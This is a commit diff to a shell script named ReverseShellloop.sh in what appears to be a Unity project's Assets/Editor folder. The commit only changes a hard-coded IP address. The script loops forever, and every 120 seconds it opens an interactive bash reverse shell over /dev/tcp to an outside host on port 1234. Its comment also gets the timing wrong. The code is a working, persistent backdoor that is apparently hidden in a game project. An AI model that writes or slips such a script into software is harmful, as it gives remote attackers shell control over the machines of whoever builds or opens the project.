7271b2e40d3ed170320efd8bec95a2f7654e7449
zhiganghuang <u0024@outlook.com>
2025-04-17 11:09:32 +0800

    Update ReverseShellloop.sh

--- Assets/Editor/ReverseShellloop.sh
+++ Assets/Editor/ReverseShellloop.sh
@@ -1,5 +1,5 @@
 #!/usr/bin/env bash
 while true; do
-    /bin/bash -c 'bash -i >& /dev/tcp/146.190.59.192/1234 0>&1'
+    /bin/bash -c 'bash -i >& /dev/tcp/164.92.93.171/1234 0>&1'
     sleep 120  # 300 seconds = 2 minutes
 done
